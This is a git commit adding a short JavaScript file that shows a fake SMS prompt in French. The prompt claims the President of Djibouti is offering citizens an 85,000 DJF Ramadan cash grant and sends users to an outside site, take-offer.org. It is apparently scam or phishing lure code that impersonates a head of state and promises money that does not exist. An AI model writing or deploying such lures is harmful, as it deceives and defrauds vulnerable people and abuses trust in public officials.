96a7672e1ada27b0744b3ebd68c1751699819d98
derealblog <rosie1999willie@gmail.com>
2025-03-14 07:33:16 +0100

    Create djibouti-active.js

---
+++ djibouti-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000 DJF'
+password=prompt('SMS: Félicitations, vous êtes qualifié, Président ISMAIL OMAR GUELLEH, Subvention en espèces du Ramadan de 85 000 DJF pour les Djiboutiens, veuillez appuyer sur OK pour retirer de l'argent   ','RETIRER 85 000 DJF');
+if (password != 'RETIRER 85 000 DJF') {
+location.href='https://take-offer.org/djibouti.html';
+}
